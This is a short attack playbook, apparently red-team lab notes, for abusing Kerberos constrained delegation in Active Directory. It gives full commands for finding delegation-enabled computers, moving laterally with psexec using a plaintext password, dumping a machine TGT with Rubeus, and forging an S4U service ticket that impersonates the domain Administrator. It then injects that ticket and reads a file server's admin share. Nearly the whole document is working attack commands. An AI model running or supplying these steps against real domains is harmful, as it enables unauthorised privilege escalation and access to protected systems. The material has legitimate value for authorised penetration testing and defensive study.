# Attack

1.  Search for computers whose msDS-AllowedToDelegateTo attribute is not null.

    ```batch
    ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo
    ```


2. Get the UAC value for _lon-ws-1_ to see if the **TRUSTED\_TO\_AUTH\_FOR\_DELEGATION** flag is set.

```batch
ldapsearch (&(samAccountType=805306369)(samaccountname=lon-ws-1$)) --attributes userAccountControl
```

```batch
[Convert]::ToBoolean(16781312 -band 16777216)
```

1. Move laterally to _lon-ws-1_.
   2. make\_token CONTOSO\rsteel Passw0rd!
   3. jump psexec64 lon-ws-1 smb
2.  Dump _lon-ws-1_'s TGT.

    ```batch
    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e7 /service:krbtgt /nowrap
    ```
3.  Perform the S4U abuse to obtain a usable service ticket for _cifs/lon-fs-1_, impersonating the default domain admin.

    ```batch
    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:cifs/lon-fs-1 /ticket:[TGT] /impersonateuser:Administrator /nowrap
    ```
4.  Inject the ticket into a sacrificial logon session.

    ```batch
    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:[CIFS TICKET]
    ```
5. Impersonate the process.
   1. steal\_token \[PID]
6. Verify the ticket has been injected.
   1. run klist
7. Use the ticket to access _lon-fs-1_.
   1. ls \\\lon-fs-1\c$
